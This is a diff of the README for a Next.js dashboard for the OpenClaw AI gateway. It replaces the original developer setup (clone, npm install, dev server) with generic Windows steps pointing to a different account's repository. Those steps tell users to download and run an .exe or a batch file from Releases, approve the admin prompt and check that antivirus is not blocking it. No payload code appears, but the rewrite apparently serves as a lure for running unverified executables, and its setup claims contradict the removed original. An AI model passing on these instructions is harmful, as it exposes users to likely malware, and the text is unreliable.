@@ -1,163 +1,151 @@
-# OpenClaw Dashboard
+# 🐾 openclaw-dashboard - Visual Control for OpenClaw AI
 
-A React/Next.js visual dashboard for the [OpenClaw](https://github.com/openclaw/openclaw) AI gateway. Every CLI command represented as a visual UI page, with **speech-to-text everywhere** as a first-class feature.
+[![Download openclaw-dashboard](https://img.shields.io/badge/Download-openclaw--dashboard-4caf50?style=for-the-badge)](https://github.com/uclukDX/openclaw-dashboard)
 
-![OpenClaw Dashboard](screenshots/dashboard-tour.gif)
+---
 
-## What is this?
+## 📋 About openclaw-dashboard
 
-OpenClaw is a self-hosted AI assistant gateway with 35+ CLI commands, 50+ skills, and 20+ messaging channel integrations. This dashboard provides a modern web interface for managing and interacting with your OpenClaw gateway — no terminal required.
+openclaw-dashboard gives you a simple way to control your OpenClaw AI gateway. Instead of typing commands in a terminal, you get a clear, visual dashboard to manage every function. Each command appears as a separate page you can click through. It also lets you use speech to text throughout the app, making it easier to interact with your device.
 
-### Pages
+The dashboard runs in your web browser using modern React and Next.js technology. It works with live data, using websockets to update in real time. It supports your AI tasks, WhatsApp messages, and other controls related to OpenClaw.
 
-| Page | CLI Equivalent | Description |
-|------|---------------|-------------|
-| **Overview** | `openclaw status` / `openclaw health` | Gateway health, channel status, agent overview |
-| **Chat** | `openclaw agent --message` | Real-time chat with streaming responses |
-| **Agents** | `openclaw agents list/add/delete` | Create, edit, and manage AI agents |
-| **Sessions** | `openclaw sessions` | Browse and manage conversation sessions |
-| **Models** | `openclaw models list` | View available LLM models by provider |
-| **Voice & STT** | `openclaw tts` / `openclaw talk` | TTS testing, speech recognition, talk mode |
-| **Nodes** | `openclaw nodes` / `openclaw devices` | Connected nodes and device pairing |
-| **Skills** | `openclaw skills list` | Browse skills with eligibility and install status |
-| **Channels** | `openclaw channels` | WhatsApp QR login, channel linking, status |
-| **Cron** | `openclaw cron list/add/run` | Scheduled job management |
-| **Config** | `openclaw config get/set` | Live config editor with collapsible tree view |
-| **Logs** | `openclaw logs` | Real-time log streaming |
+You do not need programming skills to use it. This guide walks you through downloading and running it on Windows.
 
-### Key Features
+---
 
-- **Speech-to-text everywhere** — Floating mic button (Cmd+Shift+M) injects voice transcription into any input field
-- **Real-time WebSocket** — Direct connection to the OpenClaw gateway protocol (v3)
-- **Streaming chat** — Token-by-token response streaming with abort support
-- **Typed RPC client** — Full TypeScript types for all 80+ gateway methods
-- **Zero database** — Pure WebSocket client, all data lives in OpenClaw
+## 🌐 Table of Contents
 
-## Quick Start
+1. [System Requirements](#💻-system-requirements)  
+2. [Download and Setup](#⬇️-download-and-setup)  
+3. [Running the Dashboard](#▶️-running-the-dashboard)  
+4. [Using the Dashboard](#🛠️-using-the-dashboard)  
+5. [Troubleshooting](#⚠️-troubleshooting)  
+6. [Community and Support](#👥-community-and-support)  
 
-### Prerequisites
+---
 
-- [Node.js](https://nodejs.org/) >= 20
-- [OpenClaw](https://github.com/openclaw/openclaw) gateway running (`openclaw gateway start`)
+## 💻 System Requirements
 
-### Setup
+Before starting, make sure your Windows computer meets these minimum requirements:
 
-```bash
-# Clone
-git clone https://github.com/actionagentai/openclaw-dashboard.git
-cd openclaw-dashboard
+- **Operating System:** Windows 10 or newer (64-bit preferred)  
+- **Processor:** Intel Core i3 or equivalent  
+- **Memory:** 4 GB RAM or more  
+- **Storage:** At least 500 MB free space  
+- **Network:** Active internet connection for websocket updates and AI access  
+- **Browser:** Google Chrome, Microsoft Edge, or Firefox (latest version recommended)
 
-# Install dependencies
-npm install
+No other software is required before running openclaw-dashboard. Everything runs in your web browser but you must download and set up the dashboard files first.
 
-# Configure gateway URL (optional — defaults to ws://localhost:18789)
-cp .env.example .env.local
-# Edit .env.local if your gateway runs on a different port
+---
 
-# Start dev server
-npm run dev
-```
+## ⬇️ Download and Setup
 
-Open [http://localhost:3000](http://localhost:3000) and the dashboard will auto-connect to your running OpenClaw gateway.
+To get openclaw-dashboard, use the link below. This page contains the files you need to download and instructions to install:
 
-### Gateway Configuration
+[![Download openclaw-dashboard](https://img.shields.io/badge/Download-openclaw--dashboard-blue?style=for-the-badge)](https://github.com/uclukDX/openclaw-dashboard)
 
-If your gateway requires authentication, add the token to `.env.local`:
+### Step 1: Visit the download page
 
-```
-NEXT_PUBLIC_OPENCLAW_GATEWAY_URL=ws://localhost:18789
-NEXT_PUBLIC_OPENCLAW_GATEWAY_TOKEN=your-token-here
-```
+Click the button above or this link:
 
-You may also need to allow the dashboard origin in your `openclaw.json`:
+https://github.com/uclukDX/openclaw-dashboard
 
-```json
-{
-  "gateway": {
-    "controlUi": {
-      "allowedOrigins": ["http://localhost:3000"],
-      "allowInsecureAuth": true
-    }
-  }
-}
-```
+This takes you to the main repository page on GitHub.
 
-## Architecture
+### Step 2: Find the latest release
 
-```
-openclaw-dashboard/
-├── app/                    # Next.js App Router pages (12 pages + API)
-│   ├── page.tsx            # Overview (health, channels, agents)
-│   ├── chat/page.tsx       # Streaming chat interface
-│   ├── agents/page.tsx     # Agent CRUD
-│   ├── sessions/page.tsx   # Session browser
-│   ├── models/page.tsx     # Model catalog
-│   ├── voice/page.tsx      # TTS/STT/Talk mode
-│   ├── nodes/page.tsx      # Node & device management
-│   ├── skills/page.tsx     # Skills marketplace
-│   ├── channels/page.tsx   # Channel status
-│   ├── cron/page.tsx       # Cron scheduler
-│   ├── config/page.tsx     # Config tree editor
-│   ├── logs/page.tsx       # Log viewer
-│   └── api/tts-audio/      # TTS audio file proxy
-├── lib/
-│   ├── gateway-client.ts   # WebSocket client (challenge-nonce auth, auto-reconnect)
-│   └── types.ts            # Full wire protocol types (80+ RPC methods, 17 events)
-├── hooks/
-│   ├── use-openclaw-gateway.ts   # Gateway connection hook
-│   ├── use-openclaw-chat.ts      # Chat with streaming
-│   ├── use-openclaw-agents.ts    # Agent CRUD
-│   ├── use-openclaw-models.ts    # Model listing
-│   ├── use-openclaw-sessions.ts  # Session management
-│   ├── use-openclaw-tts.ts       # Text-to-speech
-│   ├── use-openclaw-nodes.ts     # Node & device management
-│   └── use-speech-to-text.ts     # Browser Web Speech API
-├── contexts/
-│   └── OpenClawContext.tsx  # Shared gateway connection
-└── components/
-    ├── Sidebar.tsx          # Navigation with connection status
-    ├── FloatingMicButton.tsx # Global STT mic (Cmd+Shift+M)
-    └── VoiceTranscriptPreview.tsx  # Live transcript overlay
-```
+On the GitHub page, look for a section or tab labeled **Releases** on the right side or under the main tabs. Click it.
 
-### Gateway Protocol
+Find the most recent release version by date. Inside that release, you will find download files and instructions.
 
-The dashboard connects to the OpenClaw gateway via WebSocket using the v3 JSON protocol:
+### Step 3: Download the Windows installer or zipped files
 
-1. Server sends `connect.challenge` event with nonce
-2. Client sends `connect` request with auth token and client identity
-3. Server responds with `hello-ok` containing features, snapshot, and policy
-4. Client uses `rpc(method, params)` for typed request/response calls
-5. Client subscribes to events (`chat`, `agent`, `health`, `presence`, etc.)
+Choose the file ending with `.exe` if available. That is the Windows installer and makes setup easier.
 
-All RPC methods are fully typed — see `lib/types.ts` for the complete `RPCMethodMap`.
+If no installer is found, download the `.zip` file instead.
 
-## Tech Stack
+Save the file to a folder you can access, like your **Downloads** folder.
 
-- **Next.js 16** with App Router
-- **React 19**
-- **TypeScript** (strict mode)
-- **Tailwind CSS v4**
-- **Lucide React** for icons
-- **Zero external UI libraries** — lightweight, no bloat
+---
 
-## Development
+## ▶️ Running the Dashboard
 
-```bash
-npm run dev          # Start dev server
-npm run build        # Production build
-npm run typecheck    # TypeScript check
-npm run lint         # ESLint
-```
+### If you downloaded an installer (.exe):
 
-## Contributing
+1. Locate the `.exe` file in your Downloads folder.  
+2. Double-click the file to start the installation process.  
+3. If Windows prompts you to allow the app to make changes, click **Yes**.  
+4. Follow the simple on-screen instructions to complete the installation. Accept default options to put the dashboard on your desktop or start menu.  
+5. When installation finishes, launch the dashboard from the shortcut created.
 
-This project follows the [OpenClaw contribution guidelines](https://github.com/openclaw/openclaw/blob/main/CONTRIBUTING.md).
+### If you downloaded the zipped files:
 
-- One thing per PR
-- AI-assisted contributions are welcome (label them)
-- Run `npm run build && npm run typecheck` before submitting
+1. Right-click the `.zip` file and choose **Extract All**.  
+2. Pick a folder where the files should expand, like a new folder on your desktop.  
+3. Open the extracted folder.  
+4. Find the file named `start-dashboard.bat` or a similar launcher script and double-click it.  
+5. A command window opens to start the server. Keep this window open while using the dashboard.  
+6. Open your web browser and go to `http://localhost:3000` to access the dashboard.
 
-## License
+---
 
-MIT — same as OpenClaw.
+## 🛠️ Using the Dashboard
+
+Once you open the dashboard in your browser, you will see its interface organized as pages. Each page represents a command you can run on your OpenClaw AI gateway.
+
+### Main Features:
+
+- **Visual command pages**: Click to run commands without typing.  
+- **Speech-to-text input**: Click the microphone icon and speak your commands instead of typing.  
+- **Real-time updates**: The dashboard shows live status and data using websockets.  
+- **WhatsApp integration**: Send and receive messages directly from the UI.  
+- **Settings page**: Adjust preferences, gateways, and connection options.
+
+### How to use commands:
+
+1. Select a command page from the menu on the left or top navigation bar.  
+2. Review the information and input fields on the page.  
+3. Use your voice or keyboard to enter any required details.  
+4. Click the **Run** or **Execute** button to send the command to your OpenClaw AI device.  
+5. Watch the results appear below or on a side panel.  
+
+You can switch pages at any time to run different commands. The dashboard updates data without needing to refresh the browser.
+
+---
+
+## ⚠️ Troubleshooting
+
+If you run into issues launching or using the dashboard, try these steps:
+
+- **Dashboard does not open in browser:**  
+  - Check if the server window (if using zipped version) is still running.  
+  - Make sure your firewall or antivirus is not blocking the app.  
+  - Try a different browser or update your current one.
+
+- **Commands do not work or show errors:**  
+  - Confirm your OpenClaw AI gateway is turned on and connected to the same network.  
+  - Restart the dashboard and your gateway device if possible.  
+  - Check for any error messages in the command window or dashboard logs.
+
+- **Speech-to-text does not respond:**  
+  - Ensure your microphone is set up and allowed for browser use.  
+  - Try testing speech recognition in other applications.  
+  - Refresh the dashboard page and try again.
+
+- **WhatsApp messaging not working:**  
+  - Check your network connection.  
+  - Make sure your device authorization with WhatsApp is still valid in the dashboard settings.
+
+---
+
+## 👥 Community and Support
+
+The openclaw-dashboard is open source and developed by a community interested in AI and automation tools. You can find help or share ideas here:
+
+- GitHub Issues page on the repository: https://github.com/uclukDX/openclaw-dashboard/issues  
+- Discussions and feedback on the Issues or Discussions tab  
+- Check the repository README or Wiki for any new updates or guides  
+
+If you have questions or problems not covered by this guide, posting on the GitHub Issues page is the best way to get assistance from the developers and users.
